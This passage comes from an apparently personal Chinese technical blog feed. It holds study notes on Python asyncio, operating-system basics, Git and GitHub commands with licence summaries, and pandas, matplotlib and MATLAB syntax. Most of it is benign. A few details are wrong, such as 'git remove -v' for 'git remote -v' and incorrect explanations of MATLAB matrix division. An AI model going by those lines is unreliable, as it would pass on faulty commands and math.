function_">func</span>():</span><br><span class="line"></span><br><span class="line"><span class="comment">#await用来挂起阻塞方法的执行</span></span><br><span class="line"><span class="keyword">await</span> func();</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test_1&#x27;</span>, i)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test_2&#x27;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = [test(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">    loop.close()</span><br></pre></td></tr></table></figure><hr><h2 id="十一、高级用法"><a href="#十一、高级用法" class="headerlink" title="十一、高级用法"></a>十一、高级用法</h2><blockquote><p><a href=".\9898eb96">text::PyQt5</a></p><p><a href=".\c386cf1b">text::Python爬虫</a> </p><p><a href=".\2810fc66">text::Python渗透</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 程序语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机操作系统</title>
      <link href="/posts/dbeddcc1.html"/>
      <url>/posts/dbeddcc1.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机操作系统"><a href="#计算机操作系统" class="headerlink" title="计算机操作系统"></a>计算机操作系统</h1><blockquote><p><a href="https://blog.csdn.net/Royalic/article/details/119999404">计算机操作系统知识点总结（有这一篇就够了！！！）_原来如此呀的博客-CSDN博客</a></p></blockquote><hr><h2 id="一、计算机系统概述"><a href="#一、计算机系统概述" class="headerlink" title="一、计算机系统概述"></a>一、计算机系统概述</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h3><ul><li><p>定义</p><blockquote><p>操作系统(Operation System, OS) 是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境，它是计算机系统中最基本的系统软件。</p><p>操作系统是计算机系统中最基本的系统软件。</p><p><a href="https://zhuanlan.zhihu.com/p/31444793">多道程序系统</a>：多道、宏观上并行、微观上串行。</p></blockquote></li><li><p>特征</p><blockquote><p>基本特征：并发、共享、虚拟、异步。</p></blockquote><ol><li>并发：两个或多个事件在同一时间间隔内发生。并行：同一时刻发生。</li><li>共享：互斥共享方式，临界资源。同时访问方式。</li><li>虚拟：虚拟化：对资源的逻辑抽象，隔离，再分配，管理的一个过程。虚拟机：通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境的完整计算机系统中。</li><li>异步：程序执行走走停停。</li></ol></li><li><p>目的和功能</p><ul><li>目的：处理机管理、存储器管理、文件管理、设备管理。</li><li>命令接口：联机命令接口（cmd），脱机命令接口（bat脚本）。</li><li>程序接口：由一组系统调用命令（也称广义指令）组成。例：GUI。GUI不是操作系统一部分，但他调用的命令是。</li><li>裸机：没有任何软件支持（包括操作系统）。覆盖了软件的机器称为扩充机器或虚拟机。</li></ul></li></ul><h3 id="2-发展"><a href="#2-发展" class="headerlink" title="2 发展"></a>2 发展</h3><ul><li>手工操作阶段<ul><li>特点：无操作系统。用户独占全机，CPU等待手工操作。</li></ul></li><li>批处理阶段<ul><li>目的：解决人机矛盾及CPU和 I/O 设备之间速度的不匹配</li><li>单道批处理：自动性（自动下一个任务），顺序性，单道性。</li><li>多道批处理：多道，宏观上并行，微观上串行。</li></ul></li><li>分时操作系统<ul><li>原理：时间片导致分时，人机交互。</li><li>特点：同时性（多个终端用户同时用一台计算机），交互性，独立性（用户间互不干扰），及时性。</li></ul></li><li>实时操作系统<ul><li>目的：为了能在某个时间限制内完成某些紧急任务。</li><li>硬实时系统：某个动作必须在规定时刻完成。</li><li>软实时系统：偶尔违法时间规定且不会引起永久性损害。</li></ul></li><li>网络系统<ul><li>网络操作系统：利用网络把计算机连接起来，实现各台计算机间数据共享。</li><li>分布式计算机系统：协同工作的计算机系统。</li><li>两者区别：分布式可以协同工作。</li></ul></li><li>个人操作系统<ul><li>PC机</li></ul></li></ul><h3 id="3-操作系统运行环境"><a href="#3-操作系统运行环境" class="headerlink" title="3 操作系统运行环境"></a>3 操作系统运行环境</h3><ul><li><p>模式</p><ul><li>程序分类：内核程序，自编程序。</li><li>指令分类：特权分类，非特权分类。</li><li>状态：用户态（目态），核心态（管态、内核态）。</li><li>时钟：计时。通过时钟中断的管理，可以实现进程的切换。</li><li>中断：中断机制中，只有一小部分功能属于内核，它们负责保护和恢复中断现场的信息，转移控制权相关的处理程序。</li><li>原语：不可中断。</li></ul><blockquote><p>切换到用户态的指令也是特权指令。所以访管指令不是特权指令。</p><p>切换到核心态的指令是访管指令，从而产生一个中断事件将操作系统切换成核心态。</p><p>用户程序需要用到系统指令先需要切换到核心态再执行指令。</p></blockquote></li><li><p>中断</p><ul><li>中断（Interruption）：外中断，CPU外中断，可屏蔽中断和不可屏蔽中断，异常是不可屏蔽中断。</li><li>异常（Exception）：内中断，CPU内中断，故障（Fault），自陷（Trap），终止（Abort）。</li><li>故障（Fault）：指令引发的异常，例：除以0。</li><li>自陷（Trap）：事先安排的 “ 异常 ”，例：条件陷进指令。</li><li>终止（Abort）：CPU硬件故障，例：控制器出错。<br>​</li></ul></li></ul><h3 id="4-操作系统结构"><a href="#4-操作系统结构" class="headerlink" title="4 操作系统结构"></a>4 操作系统结构</h3><h3 id="5-操作系统引导"><a href="#5-操作系统引导" class="headerlink" title="5 操作系统引导"></a>5 操作系统引导</h3><h3 id="6-虚拟机"><a href="#6-虚拟机" class="headerlink" title="6 虚拟机"></a>6 虚拟机</h3><hr><h2 id="二、进程与线程"><a href="#二、进程与线程" class="headerlink" title="二、进程与线程"></a>二、进程与线程</h2><hr><h2 id="三、内存管理"><a href="#三、内存管理" class="headerlink" title="三、内存管理"></a>三、内存管理</h2><hr><h2 id="四、文件管理"><a href="#四、文件管理" class="headerlink" title="四、文件管理"></a>四、文件管理</h2><hr><h2 id="五、输入输出管理"><a href="#五、输入输出管理" class="headerlink" title="五、输入输出管理"></a>五、输入输出管理</h2><hr><h2 id="六、常见操作系统"><a href="#六、常见操作系统" class="headerlink" title="六、常见操作系统"></a>六、常见操作系统</h2><h3 id="1-Windows-7"><a href="#1-Windows-7" class="headerlink" title="1 Windows 7"></a>1 Windows 7</h3><blockquote><p><a href=".\3bb1b741">text::Windows操作系统</a></p></blockquote><h3 id="2-Linux"><a href="#2-Linux" class="headerlink" title="2 Linux"></a>2 Linux</h3><blockquote><p><a href=".\57602ae6">text::Ubuntu Linux</a></p></blockquote><hr><h2 id="七、操作系统安全"><a href="#七、操作系统安全" class="headerlink" title="七、操作系统安全"></a>七、操作系统安全</h2><ul><li><a href="https://www.cnblogs.com/ghostdot/p/12587199.html">删库跑路 </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github使用</title>
      <link href="/posts/ad18462f.html"/>
      <url>/posts/ad18462f.html</url>
      
        <content type="html"><![CDATA[<h1 id="github使用"><a href="#github使用" class="headerlink" title="github使用"></a>github使用</h1><h2 id="一、GithubDesktop安装"><a href="#一、GithubDesktop安装" class="headerlink" title="一、GithubDesktop安装"></a>一、GithubDesktop安装</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1Gr4y177aE/?spm_id_from=333.337.search-card.all.click&amp;vd_source=b9521fbd84454f03eb78189e6ea6f9e6">githubDsektop汉化1</a></p><p><a href="https://www.jianshu.com/p/ae2dc489dddf">githubDsektop汉化2</a></p><p><a href="https://github.com/robotze/-GitHubDesktop_ZH">githubDsektop汉化工具</a></p></blockquote><h2 id="二、Github"><a href="#二、Github" class="headerlink" title="二、Github"></a>二、Github</h2><blockquote><p><a href="https://github.com/">official::github主页</a></p><p><a href="https://dashboard.gitguardian.com/">official::gitguardian</a></p><p><a href="https://www.cnblogs.com/interdepend/p/10835742.html">github私人库给他人权限</a></p></blockquote><h3 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1 基础概念"></a>1 基础概念</h3><blockquote><p>工作区：本地计算机存储和编辑代码的区域，文件都处于Untracked/Unstage（未追踪）状态。add至暂存区。</p><p>暂存区：相当于是缓冲区，文件都处于Stage（已追踪）状态。commit至本地仓库。</p><p>本地仓库：保存完整的项目历史记录。push到远程仓库，diff到工作区。</p><p>远程仓库：远程仓库。fetch至本地仓库，pull/clone至工作区。</p></blockquote><h3 id="2-github中管理"><a href="#2-github中管理" class="headerlink" title="2 github中管理"></a>2 github中管理</h3><blockquote><p>Q1：已有库添加LICENSE</p><p>A1：进入库中，点击Add file——Create New File，然后输入LICENSE，点击Choose a license template，选择模板即可。</p></blockquote><h3 id="3-token设置"><a href="#3-token设置" class="headerlink" title="3 token设置"></a>3 token设置</h3><blockquote><p>进入github——头像——setting——Developer settings——Personal access tokens——Generate new token。</p><p>Node：token名字</p><p>Expiration：有效时间</p><p>Select scopes：设置权限</p></blockquote><h3 id="4-开源协议选择"><a href="#4-开源协议选择" class="headerlink" title="4 开源协议选择"></a>4 开源协议选择</h3><blockquote><p><a href="https://www.runoob.com/w3cnote/open-source-license.html">author::各种开源协议介绍</a></p><p><a href="https://zhuanlan.zhihu.com/p/144054495">软件能否商用</a></p><p>MIT协议（只安心写代码，别人可以任意使用代码）：</p><ol><li>允许别人以任意方式使用。</li><li>署名作者。</li><li>原作者不承担代码使用后的风险。</li></ol><p>BSD协议：</p><ol><li>类似MIT协议。</li><li>MIT协议衍生软件的广告可以使用你的名字促销，但是BSD不行。</li></ol><p>Apache协议（保留专利，但别人也可以任意使用代码）：</p><ol><li>授权使用者免费使用个人专利。</li><li>使用者必须放置协议说明。</li><li>使用者需要对修改部分进行说明。</li><li>禁止用作者的名号进行商业广告。</li><li>原作者不承担代码使用后的风险。</li></ol><p>GPL协议（希望代码遍地开花）：</p><ol><li>使用者需要遵循相同协议进行开源。</li><li>原作者不承担代码使用后的风险。</li></ol><p>LGPL协议：</p><ol><li>LGPL是GPL的一个为主要为类库使用设计的开源协议。</li><li>他人修改源码后不可闭源。</li><li>新增代码不用采用相同许可证。</li><li>不需要对源码的修改之处提供说明文档。</li></ol><p>Mozilla协议：</p><ol><li>常用于开源软件项目设计的软件许可证。</li><li>他人修改源码后不可闭源。</li><li>新增代码不用采用相同许可证。</li><li><p>需要对源码的修改之处提供说明文档。</p><p>CC 协议：</p></li><li><p>署名 作品上必须附有作品的归属。如此之后，作品可以被修改，分发，复制和其它用途。</p></li><li>相同方式共享 作品可以被修改、分发或其它操作，但所有的衍生品都要置于CC许可协议下。</li><li>非商业用途 作品可以被修改、分发等等，但不能用于商业目的。（注意不同人对商业的理解不同）</li><li>禁止衍生作品。</li></ol></blockquote><h2 id="三、Git"><a href="#三、Git" class="headerlink" title="三、Git"></a>三、Git</h2><blockquote><p>下载：<a href="https://git-scm.com/downloads">official::Git - Downloads (git-scm.com)</a></p><p><a href="https://www.runoob.com/git/git-tutorial.html">Git 教程 | 菜鸟教程 (runoob.com)</a></p></blockquote><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1 基础命令"></a>1 基础命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置用户名和邮箱</span></span><br><span class="line">git config --global user.name <span class="string">&quot;name&quot;</span></span><br><span class="line">git config --global user.email 123@123.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化git（会多一个.git的隐藏文件夹，初始完后会在一个新的分支下，例如：git:(master)）</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看git状态（当前所处分支，文件状态）</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到缓存区</span></span><br><span class="line">git add &lt;file&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交（会进入vim编辑器，可以附加内容）</span></span><br><span class="line">git commit</span><br><span class="line"><span class="comment"># 添加建议信息后提交</span></span><br><span class="line">git commit -m <span class="string">&quot;Version2 and version3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看commit版本日志</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看分支（进入后按q退出）</span></span><br><span class="line">git branch</span><br><span class="line"><span class="comment"># 新建分支</span></span><br><span class="line">git branch &lt;branch_name&gt;</span><br><span class="line"><span class="comment"># 切换分支</span></span><br><span class="line">git checkout &lt;branch_name&gt;</span><br><span class="line">git switch &lt;branch_name&gt;</span><br><span class="line"><span class="comment"># 删除分支（-d：未合并分支会进行提示，-D：肯定删除）</span></span><br><span class="line">git branch -d &lt;branch_name&gt;</span><br><span class="line">git branch -D &lt;branch_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并别的分支到当前分支（有冲突手动修改文本即可）</span></span><br><span class="line">git merge &lt;branch_name&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝远程仓库</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;url&gt;</span><br><span class="line"><span class="comment"># 查看本地仓库和远程仓库的名字（结果前面是远程仓库的名字）</span></span><br><span class="line">git remove -v</span><br><span class="line"><span class="comment"># 将本地的分支版本上传到远程并合并（用户名填token，不用填密码）</span></span><br><span class="line">git push</span><br><span class="line"><span class="comment"># 拉到本地版本库</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment"># 查看本地仓库和远程仓库的区别（&lt;url&gt;可以用远程仓库名字代替，例：origin）</span></span><br><span class="line">git diff &lt;url&gt;/&lt;branch_name&gt;</span><br></pre></td></tr></table></figure><h3 id="2-初始流程"><a href="#2-初始流程" class="headerlink" title="2 初始流程"></a>2 初始流程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.先切换到指定文件夹下</span></span><br><span class="line"><span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.配置用户名和邮箱</span></span><br><span class="line">git config --global user.name <span class="string">&quot;name&quot;</span></span><br><span class="line">git config --global user.email 123@123.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.初始化git</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.新建文件并编辑文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; 1.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.添加文件到缓存区</span></span><br><span class="line">git add 1.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.提交</span></span><br><span class="line">git commit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.查看对应信息</span></span><br><span class="line">git status</span><br><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><h3 id="3-其他配置"><a href="#3-其他配置" class="headerlink" title="3 其他配置"></a>3 其他配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 忽略文件</span></span><br><span class="line"><span class="comment"># 1.新建 .gitignore</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.修改文件内容，添加需要忽视的文件名和后缀</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1.jpg&quot;</span> &gt;&gt; .gitignore</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.可以看到图片不再处在未追踪状态</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure><h3 id="4-详细参数"><a href="#4-详细参数" class="headerlink" title="4 详细参数"></a>4 详细参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># git commit</span></span><br><span class="line">-a：参数设置修改文件后不需要执行 git add 命令，直接来提交</span><br><span class="line">-m [message]：备注信息</span><br><span class="line"></span><br><span class="line"><span class="comment"># git checkout</span></span><br><span class="line">-b：创建并立即切换分支</span><br><span class="line"></span><br><span class="line"><span class="comment"># git branch</span></span><br><span class="line">-d：如果分支未合并则会进行提示</span><br><span class="line">-D：肯定删除一个分支，不会有提示</span><br></pre></td></tr></table></figure><h3 id="5-使用案例"><a href="#5-使用案例" class="headerlink" title="5 使用案例"></a>5 使用案例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 快速备注信息并提交修改，不需要先git add添加到缓冲区</span></span><br><span class="line">git commit -a -m [message]</span><br><span class="line">git commit -am [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并立即切换分支</span></span><br><span class="line">git checkout -b &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><h3 id="6-fork"><a href="#6-fork" class="headerlink" title="6 fork"></a>6 fork</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建分支和合并：</span></span><br><span class="line"><span class="comment"># 1. 进入Github，找到别人的仓库，点击fork</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 克隆自己库中刚刚fork的仓库到本地</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;url&gt; &lt;name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 修改后push</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;description&quot;</span></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.进入github，点击库上面的Contribute，点击Open pull request，写完描述后提交</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.等待原仓库主审核</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模</title>
      <link href="/posts/a66872a2.html"/>
      <url>/posts/a66872a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="数学建模"><a href="#数学建模" class="headerlink" title="数学建模"></a>数学建模</h1><blockquote><p>文献查询：</p><p><a href="http://scholar.scqylaw.com/">谷歌学术镜像_Google镜像站 (scqylaw.com)</a></p><p><a href="https://www.oalib.com/">Open Access Library (OALib)</a></p><p>数据查询：</p><p><a href="https://data.stats.gov.cn/">国家数据 (stats.gov.cn)</a></p><p><a href="https://github.com/awesomedata/awesome-public-datasets">awesome-public-datasets</a></p><p><a href="https://www.epsnet.com.cn/index.html#/Index">EPSDATA官网 (epsnet.com.cn)</a></p></blockquote><hr><h1 id="Python图形处理库"><a href="#Python图形处理库" class="headerlink" title="Python图形处理库"></a>Python图形处理库</h1><h2 id="一、panda库"><a href="#一、panda库" class="headerlink" title="一、panda库"></a>一、panda库</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取xls文件</span></span><br><span class="line">data = pd.read_excel(<span class="string">r&#x27;.\data.xlsx&#x27;</span>,<span class="string">&#x27;sheet1&#x27;</span>)</span><br><span class="line"><span class="comment"># 标题行</span></span><br><span class="line">lst = data.columns</span><br><span class="line"><span class="comment"># 数据行</span></span><br><span class="line">data.loc[row]</span><br><span class="line"><span class="comment"># 数据行列（从0开始）</span></span><br><span class="line">data.iloc[row] <span class="comment"># 一行数据</span></span><br><span class="line">data.iloc[row,col] <span class="comment"># 具体数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据结构</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;col1&#x27;</span>:col_1, <span class="string">&#x27;col2&#x27;</span>:col_2&#125;)</span><br><span class="line"><span class="comment"># 打开文件写入数据</span></span><br><span class="line">writer = pd.ExcelWriter(<span class="string">&#x27;output.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line">df.to_excel(writer,sheet_name=<span class="string">&#x27;Sheet1&#x27;</span>,index=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">writer._save()</span><br></pre></td></tr></table></figure><hr><h2 id="二、matlab库"><a href="#二、matlab库" class="headerlink" title="二、matlab库"></a>二、matlab库</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/489552450">【Matplotlib】add_subplot 和 subplots_adjust</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接调用matplotlib.pyplot的画图函数</span></span><br><span class="line">plt.&lt;matlab_function&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画图 </span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多图显示</span></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> lst[-<span class="number">6</span>:-<span class="number">1</span>]:</span><br><span class="line">    fig = plt.figure(title, figsize=(<span class="number">6</span>, <span class="number">4</span>)).add_subplot(<span class="number">111</span>)</span><br><span class="line">    <span class="comment"># 创建幕布 图片大小 添加子图</span></span><br><span class="line">    fig.scatter(data[<span class="string">&#x27;时间&#x27;</span>], data[title]) <span class="comment">#散点图</span></span><br><span class="line">    fig.set_xlabel(<span class="string">&#x27;天&#x27;</span>)</span><br><span class="line">    fig.set_ylabel(title)</span><br><span class="line">    fig.set_title(title)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同图显示双线</span></span><br><span class="line">x = data[<span class="string">&#x27;时间&#x27;</span>]</span><br><span class="line">y = data[lst[idx]]</span><br><span class="line">f = interpolate.interp1d(x,y,kind=<span class="string">&quot;linear&quot;</span>)</span><br><span class="line">new_y = f(x)</span><br><span class="line">fig = plt.figure(lst[idx], figsize=(<span class="number">20</span>, <span class="number">20</span>)).add_subplot(<span class="number">111</span>)</span><br><span class="line">fig.plot(x,y,<span class="string">&#x27;-or&#x27;</span>,label=<span class="string">&#x27;Original&#x27;</span>)</span><br><span class="line">fig.plot(x,new_y,<span class="string">&#x27;-*b&#x27;</span>,label=<span class="string">&#x27;Interpolate&#x27;</span>)</span><br><span class="line">fig.set_xlabel(<span class="string">&#x27;天&#x27;</span>)</span><br><span class="line">fig.set_ylabel(lst[idx])</span><br><span class="line">fig.set_title(lst[idx])</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中文乱码</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure><hr><h1 id="MATLAB"><a href="#MATLAB" class="headerlink" title="MATLAB"></a>MATLAB</h1><blockquote><p><a href="https://ww2.mathworks.cn/help/matlab/index.html?s_tid=CRUX_lftnav">official::MATLAB Documentation - MathWorks 中国</a> </p><p><a href="https://www.tutorialspoint.com/execute_matlab_online.php">云MATLAB</a></p></blockquote><hr><h2 id="一、软件使用"><a href="#一、软件使用" class="headerlink" title="一、软件使用"></a>一、软件使用</h2><hr><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%  单行注释</span></span><br><span class="line"><span class="comment">%% 有横线的注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 语句尾部带分号会避免结果的输出</span></span><br><span class="line"><span class="comment">% 一条语句执行后会有一个返回值，不想要返回值就在语句后加上分号</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">% 续行</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1 数据类型"></a>1 数据类型</h3><h4 id="1-1-变量"><a href="#1-1-变量" class="headerlink" title="1.1 变量"></a>1.1 变量</h4><blockquote><p><a href="https://blog.csdn.net/qq_54186956/article/details/127274462">定义变量</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义变量</span></span><br><span class="line">x = sym(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">syms x,y,z;</span><br><span class="line"></span><br><span class="line"><span class="comment">% f(x,y)=3*x^2+4*y^2+1</span></span><br><span class="line">f = symfun(<span class="number">3</span>*x^<span class="number">2</span>+<span class="number">4</span>*y^<span class="number">2</span>+<span class="number">1</span>,[x,y])</span><br><span class="line"></span><br><span class="line"><span class="comment">% 特殊变量</span></span><br><span class="line"><span class="comment">% 结果</span></span><br><span class="line"><span class="built_in">ans</span></span><br><span class="line"><span class="comment">% π</span></span><br><span class="line"><span class="built_in">pi</span></span><br><span class="line"><span class="comment">% 计算机最小数</span></span><br><span class="line"><span class="built_in">eps</span></span><br><span class="line"><span class="comment">% 无穷大</span></span><br><span class="line"><span class="built_in">inf</span></span><br><span class="line"><span class="comment">% 缺省</span></span><br><span class="line">NAN</span><br><span class="line"><span class="comment">% 虚数单位</span></span><br><span class="line"><span class="built_in">i</span>,<span class="built_in">j</span></span><br></pre></td></tr></table></figure><h4 id="1-2-数字"><a href="#1-2-数字" class="headerlink" title="1.2 数字"></a>1.2 数字</h4><blockquote><p>同pyhton。</p></blockquote><h4 id="1-3-字符和字符串"><a href="#1-3-字符和字符串" class="headerlink" title="1.3 字符和字符串"></a>1.3 字符和字符串</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义字符串（单引号）</span></span><br><span class="line">s = <span class="string">&#x27;str&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 字符获得数字</span></span><br><span class="line"><span class="built_in">abs</span>(s)</span><br><span class="line"><span class="comment">% 数字获得字符</span></span><br><span class="line">char(num)</span><br><span class="line"><span class="comment">% 数字转字符串</span></span><br><span class="line">num2str(num)</span><br><span class="line"><span class="comment">% 字符串长</span></span><br><span class="line"><span class="built_in">length</span>(s)</span><br></pre></td></tr></table></figure><h4 id="1-4-矩阵"><a href="#1-4-矩阵" class="headerlink" title="1.4 矩阵"></a>1.4 矩阵</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义矩阵（横用空格隔开，竖用分号隔开） matrix = []</span></span><br><span class="line">mat = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>;<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>;]</span><br><span class="line"></span><br><span class="line"><span class="comment">% 转置（行变列，列变行）</span></span><br><span class="line">new_mat = mat&#x27;</span><br><span class="line"><span class="comment">% 拉成一列（竖着拉）</span></span><br><span class="line">new_mat = mat(:)</span><br><span class="line"><span class="comment">% 方阵求逆</span></span><br><span class="line">new_mat = inv(mat)</span><br><span class="line"><span class="comment">% 单位阵</span></span><br><span class="line">E = mat * inv(mat)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建步长矩阵(start:step:end)，包括end</span></span><br><span class="line">E = <span class="number">1</span>:<span class="number">2</span>:<span class="number">9</span></span><br><span class="line"><span class="comment">% 重复矩阵，row重复，col重复</span></span><br><span class="line">E = <span class="built_in">repmat</span>(mat,row_rep,col_rep)</span><br><span class="line"><span class="comment">% 创建全1矩阵</span></span><br><span class="line">E = <span class="built_in">ones</span>(row,col)</span><br><span class="line"><span class="comment">% 创建0矩阵（行，列，维度）</span></span><br><span class="line">E = <span class="built_in">zeros</span>(row,col,Dimension)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 选定矩阵，:表示全部</span></span><br><span class="line">E(<span class="number">3</span>,:)</span><br><span class="line"><span class="comment">% 选定指定维度矩阵</span></span><br><span class="line">E(:,:,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 矩阵加减，对应位置加减</span></span><br><span class="line">E = A + B</span><br><span class="line">E = A - B</span><br><span class="line"><span class="comment">% 矩阵相乘（A行值等于B列值） / 对应位置相乘</span></span><br><span class="line">E = A * B</span><br><span class="line">E = A .* B</span><br><span class="line"><span class="comment">% 矩阵相除（A * B&#x27;） / 对应位置相除</span></span><br><span class="line">E = A / B</span><br><span class="line">E = A ./ B</span><br><span class="line"><span class="comment">% 左除（A&#x27; * B）</span></span><br><span class="line">E = A \ B</span><br><span class="line"><span class="comment">% 矩阵乘幂 / 对应位置幂</span></span><br><span class="line">E = A ^ B</span><br><span class="line">E = A .^ <span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="1-5-元胞数组"><a href="#1-5-元胞数组" class="headerlink" title="1.5 元胞数组"></a>1.5 元胞数组</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义元胞数组（python的list） cell = &#123;&#125;</span></span><br><span class="line">cel = cell(row,col)</span><br><span class="line"><span class="comment">% 索引（从1开始）</span></span><br><span class="line">cel&#123;index&#125;</span><br></pre></td></tr></table></figure><h4 id="1-6-结构体"><a href="#1-6-结构体" class="headerlink" title="1.6 结构体"></a>1.6 结构体</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 